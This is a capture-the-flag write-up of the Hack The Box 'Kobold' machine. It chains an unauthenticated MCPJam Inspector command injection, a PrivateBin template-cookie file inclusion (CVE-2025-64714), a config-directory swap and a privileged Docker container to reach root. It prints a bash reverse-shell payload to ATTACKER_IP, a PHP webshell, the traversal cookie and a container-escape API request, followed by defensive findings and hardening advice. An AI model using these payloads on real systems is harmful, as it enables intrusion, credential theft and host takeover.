---
layout: writeup
title: "Kobold"
platform: HTB
os: "Linux"
date: 2026-03-21
techniques: ["RCE via MCPJam Inspector", "LFI to RCE via PrivateBin template cookie", "Bind mount inode persistence", "No-sticky-bit directory rename", "Docker container privilege escalation via Arcane API", "SSRF", "CVE enumeration"]
cve: ["CVE-2025-64714", "CVE-2026-23944"]
description: "MCPJam Inspector unauthenticated RCE → PrivateBin template cookie LFI → config directory swap to leak credentials → Arcane Docker management admin login → privileged container with host root mount → root"
---

# Kobold — Technical Report

> **Platform:** Hack The Box (Season 10) \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-21 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

> The "Kobold" machine hosted three web services: MCPJam Inspector, PrivateBin, and Arcane Docker Management. An unauthenticated command injection in MCPJam Inspector provided initial access. A path traversal in PrivateBin's template cookie enabled PHP code execution inside the PrivateBin Docker container. By exploiting a world-writable parent directory (missing sticky bit) on the host, the PrivateBin configuration directory was swapped, revealing the original config — which contained the Arcane admin password — through the container's bind mount. With Arcane admin access, a privileged Docker container was created with the host root filesystem mounted, achieving full system compromise. Immediate remediation of unauthenticated RCE endpoints and credential storage practices is recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Kobold"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow a standard OSCP-style methodology: reconnaissance, enumeration, exploitation, lateral movement, and privilege escalation.

---

## 2. Attack Chain

```
Nmap → Vhost Discovery → MCPJam Inspector RCE (ben) → PrivateBin Template Cookie LFI → PHP RCE in Container → Config Directory Swap (no sticky bit) → Read Original Config via Bind Mount Inode → Arcane Admin Password → Arcane API Auth → Privileged Docker Container (host root mount) → Root
```

---

## 2.1 Timeline

| Time (UTC) | Duration | Phase | Activity |
|------------|----------|-------|----------|
| ~19:11 | — | Recon | Initial nmap scan, discovered ports 22, 80, 443, 3552 |
| ~19:13 | ~5 min | Recon | Gobuster directory enumeration on kobold.htb |
| ~19:15 | ~10 min | Recon | Vhost discovery — found `mcp.kobold.htb` and `bin.kobold.htb` |
| ~19:30 | ~15 min | Enumeration | Explored MCPJam Inspector UI, PrivateBin, Arcane API |
| ~19:45 | ~15 min | Enumeration | Retrieved Arcane OpenAPI spec, mapped all endpoints |
| ~20:00 | ~5 min | **Foothold** | **MCPJam Inspector RCE → reverse shell as ben** |
| ~20:03 | ~5 min | Post-exploit | Shell stabilization, grabbed user flag |
| ~20:05 | ~25 min | Enumeration | System enumeration: groups, services, configs, Arcane service file (found ENCRYPTION_KEY), identified alice in docker group |
| ~20:30 | ~10 min | Dead end | Attempted su to alice with guessed passwords |
| ~20:37 | ~5 min | Dead end | sudo -l attempts (password required) |
| ~20:40 | ~20 min | **PrivateBin RCE** | **Exploited template cookie LFI (CVE-2025-64714), established PHP webshell in container** |
| ~21:00 | ~15 min | Container enum | Enumerated container: Alpine, nobody:82, no docker.sock, bind mounts identified |
| ~21:10 | ~20 min | Dead end | Tried accessing Arcane from container (no curl, found php84), all returned 401 |
| ~21:30 | ~15 min | Dead end | Tried default Arcane credentials (arcane/arcane-admin, admin/admin, etc.) — all failed |
| ~21:40 | ~20 min | Dead end | SSRF exploration via `/api/templates/fetch` — confirmed working but couldn't bypass auth |
| ~21:50 | ~15 min | Dead end | JWT forgery with ENCRYPTION_KEY — tried raw and base64-decoded, various claim formats — all 401 |
| ~22:00 | ~10 min | CVE Research | Found CVE-2026-23520 (fixed in our version) and CVE-2026-23944 (auth bypass — our version vulnerable!) |
| ~22:05 | ~15 min | CVE Exploit | Confirmed CVE-2026-23944 auth bypass working on non-zero environment IDs + Docker sub-paths. But no remote environment exists |
| ~22:15 | ~5 min | Dead end | Attempted environment pairing — API key unknown, ENCRYPTION_KEY rejected |
| ~22:20 | ~10 min | Dead end | No-sticky-bit directory rename on e3 — worked! But still couldn't read contents (drwx------) |
| ~22:30 | ~10 min | Dead end | Tried brute-forcing e3 subdirectory names, tar, debugfs, setfacl — all failed |
| ~22:40 | ~5 min | Dead end | Checked SUID, capabilities, cron, timers — all standard |
| ~22:49 | ~5 min | Dead end | Found `/tmp/pb.key` — turned out to be PrivateBin TLS private key, not SSH |
| ~22:55 | ~10 min | **Breakthrough** | **Renamed `/privatebin-data/cfg` → `cfg_bak`, created new cfg dir. Container bind mount still references original inode!** |
| ~23:05 | ~5 min | **Cred found** | **Read original config via container PHP shell — found `pwd = "[REDACTED]"`** |
| ~23:10 | ~5 min | Pivot | Tested password: failed for ben sudo, failed for alice su |
| ~23:13 | ~2 min | **Arcane auth** | **Password worked for Arcane login as `arcane` user — admin JWT obtained!** |
| ~23:16 | ~3 min | Enumeration | Listed containers and images via Arcane API (found mysql:latest, privatebin images) |
| ~23:18 | ~2 min | **Root** | **Created privileged Docker container with host root mounted, copied root flag to /tmp** |
| ~23:19 | — | **Done** | **Root flag obtained from `/tmp/rootflag.txt`** |

**Total time: ~4 hours** (19:11 → 23:19 UTC)
**Active exploitation: ~30 minutes** (foothold + user: ~5 min, config swap + root: ~25 min)
**Dead ends / enumeration: ~3.5 hours**

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` / `ffuf` | Directory & vhost enumeration |
| `curl` | HTTP requests, API interaction, exploit delivery |
| `python3` | Shell stabilization, JSON parsing, JWT forging attempts |
| `openssl` | Certificate inspection, key comparison |
| Web browser | Initial service inspection |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -oA initial 10.129.12.70
nmap -sC -sV -p- -oA all_ports 10.129.12.70
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu | Standard SSH |
| 80 | HTTP | nginx | Redirects to HTTPS |
| 443 | HTTPS | nginx | SSL cert for `kobold.htb` + `*.kobold.htb` — "Kobold Operations Suite" |
| 3552 | HTTP | Arcane v1.13.0 | Go + SvelteKit Docker management panel |

**Key Observations:**
- Wildcard SSL certificate (`*.kobold.htb`) indicates virtual hosts
- Port 3552 runs Arcane, a Docker management UI (similar to Portainer)
- The main site on 443 is a static landing page with no interactive functionality

### 4.2 Virtual Host Discovery

Using the wildcard cert as a hint, vhost fuzzing discovered:

| Vhost | Service | Internal Port |
|-------|---------|---------------|
| `kobold.htb` | Static landing page | 443 (nginx direct) |
| `mcp.kobold.htb` | MCPJam Inspector | 6274 (proxied via nginx) |
| `bin.kobold.htb` | PrivateBin 2.0.2 | 8080 (Docker container, proxied via nginx) |

---

## 5. Service Enumeration

### 5.1 MCPJam Inspector (`mcp.kobold.htb`)

MCPJam Inspector is a web-based tool for testing Model Context Protocol (MCP) servers. The UI presented a login page but also exposed API endpoints. Key discovery:

- `POST /api/mcp/connect` — accepts a `serverConfig` object with `command` and `args` fields
- No authentication required on this endpoint
- The endpoint passes the command directly to the OS for execution

### 5.2 PrivateBin (`bin.kobold.htb`)

PrivateBin 2.0.2 — a zero-knowledge paste bin. Configuration had `templateselection = true`, enabling a template cookie that controls which PHP template file is included.

### 5.3 Arcane (`kobold.htb:3552`)

Arcane v1.13.0 — a Docker management interface. Full OpenAPI spec available at `/api/openapi.json`. Key unauthenticated endpoints:
- `GET /api/health` — health check
- `GET /api/version` — version info (v1.13.0)
- `GET /api/environments/{id}/settings/public` — revealed `dockerHost: unix:///var/run/docker.sock`
- `GET /api/templates/fetch?url=...` — SSRF (fetches arbitrary HTTP URLs)
- `POST /api/environments/pair` — environment pairing (requires valid X-API-Key)

### 5.4 Internal Services (discovered after foothold)

| Port | Binding | Service |
|------|---------|---------|
| 8080 | 127.0.0.1 | PrivateBin (Docker container) |
| 6274 | 127.0.0.1 | MCPJam Inspector (Node.js) |
| 35715 | 127.0.0.1 | Unknown (returned 404 on all paths — possibly Arcane internal) |

---

## 6. Initial Access — MCPJam Inspector RCE

### 6.1 Vulnerability Identification

**Vulnerability:** MCPJam Inspector ≤1.4.2 — Unauthenticated Remote Code Execution
**Location:** `POST /api/mcp/connect`
**Reasoning:** The endpoint accepts arbitrary OS commands via the `serverConfig.command` and `serverConfig.args` fields, intended for launching MCP server processes. No authentication is required. The command is executed directly by the server process.

### 6.2 Exploitation

```bash
# Listener on attacker machine
nc -lvnp 4444

# Trigger RCE
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"env":{}},"serverId":"test"}'
```

**Result:** Reverse shell as `ben` (uid=1001, gid=1001, groups: ben, operator).

### 6.3 Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg
```

### 6.4 User Flag

```
/home/ben/user.txt → [REDACTED]
```

---

## 7. Lateral Movement — PrivateBin Container RCE

### 7.1 Vulnerability Identification

**Vulnerability:** CVE-2025-64714 — PrivateBin 2.0.2 Template Cookie Path Traversal → PHP Local File Inclusion → RCE
**Location:** `template` cookie value used in PHP `include()` without sanitization
**Reasoning:** With `templateselection = true` in the PrivateBin config, the application reads a `template` cookie to select which PHP template to include. The value is not sanitized, allowing `../` traversal to include arbitrary `.php` files on the filesystem.

### 7.2 Webshell Setup

The PrivateBin container's data directory (`/srv/data`) is bind-mounted from the host at `/privatebin-data/data`, which is world-writable (`drwxrwxrwx`). This allowed writing a PHP webshell from ben's host shell:

```bash
# From ben's shell on the host
cat > /privatebin-data/data/juno.php <<'PHP'
<?php echo "JUNO_START\n"; system($_GET['c'] ?? 'id'); echo "\nJUNO_END\n"; ?>
PHP
chmod 644 /privatebin-data/data/juno.php
```

### 7.3 Triggering the LFI

```bash
# Helper function on Kali
pb() {
  curl -skG 'https://10.129.12.70/' \
    -H 'Host: bin.kobold.htb' \
    -b 'template=../data/juno' \
    --data-urlencode "c=$1"
}

# Proof of execution
pb 'id'
# uid=65534(nobody) gid=82(www-data) — inside Docker container
```

### 7.4 Container Enumeration Results

- Alpine-based PrivateBin Docker container (ID: 4c49dd7bb727)
- All processes run as `nobody:82` (including s6 init and PHP-FPM master)
- PHP binary at `/usr/bin/php84` (no `curl` available, but PHP HTTP functions work)
- No Docker socket mounted inside the container
- Container gateway (host): 172.17.0.1
- `/srv/data` = host's `/privatebin-data/data` (rw bind mount)
- `/srv/cfg` = host's `/privatebin-data/cfg` (ro bind mount)

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` → "command not allowed" (ben has sudo rules but password required)
- [x] SUID binaries → standard set only (mount, umount, su, sudo, passwd, etc.)
- [x] Capabilities → only ping and mtr-packet with `cap_net_raw`
- [x] Cron jobs → standard system crons only
- [x] Systemd timers → standard timers only
- [x] Bash history → 0 bytes (empty)
- [x] Writable files/dirs → `/privatebin-data/data` (world-writable, no sticky bit!)
- [x] Running processes / internal ports → Arcane (root, PID 1498), MCPJam (ben), PrivateBin (container)
- [x] Config files → Arcane service file with `ENCRYPTION_KEY` (no `JWT_SECRET`)
- [x] Group membership → ben is in `operator` group; alice is in `docker` group

**Key Findings:**

1. **Arcane runs as root** with `ENCRYPTION_KEY="[REDACTED]"` set in `/etc/systemd/system/arcane.service`. No `JWT_SECRET` was set.

2. **alice is in the docker group** — getting alice's credentials or Arcane admin access would provide a path to root via Docker.

3. **`/privatebin-data/data/` has NO sticky bit** (`drwxrwxrwx` not `drwxrwxrwt`) — any user can rename/move files within it regardless of ownership.

4. **`/privatebin-data/data/e3/`** — a PrivateBin paste directory owned by `root:operator` with `drwx------` permissions. Completely unreadable by ben (despite being in operator group — no group read bit).

5. **`/privatebin-data/cfg/`** — PrivateBin config directory, `root:82 drwxr-x---`. Not readable by ben, but ben can rename it since `/privatebin-data/` is `drwxrwx--- root:operator` (ben is in operator).

### 8.2 Dead Ends Explored

Before finding the correct path, significant time was spent on:

- **JWT forgery** with ENCRYPTION_KEY as signing secret (both raw and base64-decoded) → all returned 401
- **Default Arcane credentials** (`arcane/arcane-admin`, `admin/arcane-admin`, etc.) → all failed (password was changed)
- **SSRF via `/api/templates/fetch`** → confirmed working but couldn't bypass auth on internal endpoints
- **CVE-2026-23520** (Arcane lifecycle label RCE) → fixed in v1.13.0 (our version)
- **CVE-2026-23944** (Arcane auth bypass for remote environments) → confirmed working! Auth was bypassed for non-zero environment IDs on Docker proxy paths (`/containers`, `/images`, etc.), but no remote environment existed to proxy to. All non-zero IDs returned "Environment not found"
- **Reading `/privatebin-data/data/e3/`** directly → failed (drwx------ root:operator, no group read)
- **Brute forcing paste IDs via PrivateBin API** → paste IDs are 16 random hex chars, infeasible
- **PrivateBin admin script** (`/srv/bin/administration --list-ids`) → runs as nobody:82, couldn't read e3
- **debugfs on block device** → `/dev/dm-0` is `root:disk`, ben not in disk group
- **setfacl** → not installed on the system
- **PHP-FPM socket** → `srw-rw---- www-data:www-data`, inaccessible to ben
- **Process memory/fd reading** (`/proc/1498/exe`, `/proc/1498/environ`) → permission denied (root process)
- **SSH with `/tmp/pb.key`** → this was just the PrivateBin TLS private key, not an SSH key

### 8.3 The Breakthrough — Config Directory Swap

The critical insight was combining two facts:
1. `/privatebin-data/` is writable by the operator group (`drwxrwx---`)
2. Docker bind mounts reference the **original inode**, not the path name

**Step 1: Rename the original config directory**

```bash
mv /privatebin-data/cfg /privatebin-data/cfg_bak
```

This works because `/privatebin-data/` is group-writable for operator (ben's group), and there is no sticky bit.

**Step 2: Create a replacement config directory**

```bash
mkdir /privatebin-data/cfg
chmod 755 /privatebin-data/cfg
```

A new empty `cfg` directory now exists at the original path, owned by ben.

**Step 3: Understand the bind mount behavior**

The Docker container's bind mount for `/srv/cfg` was created when the container started, pointing to the **inode** of the original `/privatebin-data/cfg` directory. After the rename, the container's `/srv/cfg` still points to the original directory (now called `cfg_bak` on the host). The host path `/privatebin-data/cfg` now points to ben's new empty directory, but the container doesn't care — it follows the inode.

**Step 4: Read the original config through the container**

Since the container still sees the original config at `/srv/cfg/conf.php`, and the PHP webshell runs inside the container:

```bash
pb 'grep -i "pass\|secret\|key\|token\|user\|admin\|alice\|ben\|arcane" /srv/cfg/conf.php 2>&1'
```

This revealed a password embedded in the PrivateBin configuration file:

```ini
pwd = "[REDACTED]"
```

### 8.4 Arcane Admin Access

The discovered password worked for the Arcane admin account:

```bash
curl -sk -X POST http://kobold.htb:3552/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"arcane","password":"[REDACTED]"}'
```

Response confirmed admin access with a valid JWT token, user `arcane` with role `admin`.

### 8.5 Docker Privilege Escalation

With Arcane admin access, the Docker management API was fully available. The environment used `unix:///var/run/docker.sock` as the Docker host.

**Step 1: Create a privileged container with host root mounted**

```bash
TOKEN="<JWT_TOKEN>"

curl -sk -X POST http://kobold.htb:3552/api/environments/0/containers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pwn2",
    "image": "mysql:latest",
    "cmd": ["sh", "-c", "cat /mnt/host/root/root.txt > /mnt/host/tmp/rootflag.txt && chmod 644 /mnt/host/tmp/rootflag.txt && sleep infinity"],
    "volumes": ["/:/mnt/host"],
    "privileged": true
  }'
```

The Arcane API created and started the container, which:
- Mounted the host's entire root filesystem at `/mnt/host`
- Ran as privileged (full capabilities)
- Copied the root flag to a world-readable location on the host

**Step 2: Read the flag from the host**

```bash
# From ben's shell
cat /tmp/rootflag.txt
```

**Result:** Root flag obtained. Full system compromise achieved.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | MCPJam Inspector unauthenticated RCE | 🔴 Critical | `POST /api/mcp/connect` on `mcp.kobold.htb` |
| 2 | PrivateBin 2.0.2 template cookie path traversal (CVE-2025-64714) | 🔴 Critical | `template` cookie → PHP `include()` |
| 3 | Plaintext password in PrivateBin configuration file | 🔴 Critical | `/privatebin-data/cfg/conf.php` |
| 4 | World-writable directory without sticky bit | 🟠 High | `/privatebin-data/data/` (`drwxrwxrwx`) |
| 5 | Parent directory writable by operator group | 🟠 High | `/privatebin-data/` (`drwxrwx--- root:operator`) |
| 6 | Arcane Docker management running as root | 🟠 High | systemd service `arcane.service` |
| 7 | Arcane auth bypass on remote environment proxy (CVE-2026-23944) | 🟡 Medium | `/api/environments/{id}/...` for non-local IDs (v1.13.0 < v1.13.2) |
| 8 | SSRF in Arcane template fetch | 🟡 Medium | `GET /api/templates/fetch?url=...` |
| 9 | ENCRYPTION_KEY exposed in systemd service file | 🟡 Medium | `/etc/systemd/system/arcane.service` |
| 10 | No JWT_SECRET configured for Arcane | 🔵 Low | Arcane service environment variables |

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Reverse shell connections from the MCPJam Inspector process (ben user) to external IPs
- Unusual PHP files in `/privatebin-data/data/` (e.g., `juno.php` webshell)
- HTTP requests to PrivateBin with `template=../data/...` cookie values
- Directory rename operations on `/privatebin-data/cfg`
- New Docker containers created via Arcane API with host volume mounts (`/:/mnt/host`)
- Files appearing in `/tmp/` written by Docker containers (e.g., `rootflag.txt`)
- Arcane login events for the `arcane` admin user from unexpected source IPs

### 10.2 Security Weaknesses

- MCPJam Inspector exposes arbitrary command execution without any authentication
- PrivateBin template selection feature allows directory traversal in PHP includes
- Sensitive credentials stored in plaintext within a configuration file
- Directory permissions allow unauthorized file operations (rename/move) due to missing sticky bit
- Docker bind mount inode behavior allows reading swapped-out configurations
- Arcane Docker management panel provides full container lifecycle control including privileged containers
- No network segmentation between services

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove or restrict MCPJam Inspector from production; add authentication | #1 |
| Immediate | Upgrade PrivateBin to latest version; disable `templateselection` | #2 |
| Immediate | Remove plaintext password from configuration files; use secrets management | #3 |
| Short-term | Add sticky bit to world-writable directories (`chmod +t`) | #4 |
| Short-term | Restrict `/privatebin-data/` to root-only write access | #5 |
| Short-term | Run Arcane as non-root user; use Docker socket proxy with restricted permissions | #6 |
| Short-term | Upgrade Arcane to v1.13.2+ to fix auth bypass (CVE-2026-23944) | #7 |
| Long-term | Remove SSRF-capable endpoints or implement URL allowlisting | #8 |
| Long-term | Use environment variables or vault for secrets, not config files or systemd units | #9, #10 |
| Long-term | Implement network segmentation between services and least-privilege Docker access | All |

---

## 11. Lessons Learned

- **Always check for world-writable directories without sticky bits.** The missing sticky bit on `/privatebin-data/data/` was the key that unlocked the entire privilege escalation chain. The ability to rename directories in a shared mount point, combined with Docker's inode-based bind mounts, created an unintended information disclosure path.

- **Docker bind mounts follow inodes, not paths.** When a directory is renamed on the host after a container has started, the container's bind mount still references the original directory's inode. This can be weaponized to read files that are otherwise inaccessible on the host, by swapping directories and accessing the original through the container.

- **Don't store passwords in configuration files.** The Arcane admin password was embedded in the PrivateBin config file (`conf.php`). Even though the file had restricted permissions, the bind mount + directory swap trick made it accessible. Secrets should be managed through proper secrets management solutions, not embedded in config files.

- **Grep harder, grep everything.** The password was found by grepping the full PrivateBin config for common credential keywords. The config was ~25KB and the password was buried deep in a section that looked like commented-out example configuration. Always search config files thoroughly.

- **Check CVEs for all services and their exact versions.** CVE-2026-23944 (Arcane auth bypass) was confirmed exploitable on v1.13.0 (fixed in v1.13.2). While it wasn't the final exploitation path (no remote environments existed), confirming it worked validated the approach and informed the overall attack strategy.

- **`sudo -l` requires a TTY and password on this box**, but the journalctl logs revealed that sudo rules DO exist for ben ("command not allowed"). This was a hint that finding ben's password (or any valid password) was part of the intended path.

- **Easy boxes can have complex chains.** Despite being rated "Easy," this box required chaining three separate vulnerabilities across three services, understanding Docker bind mount internals, and a creative config-swap technique. The difficulty rating reflects the individual vulnerability complexity, not necessarily the length of the chain.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
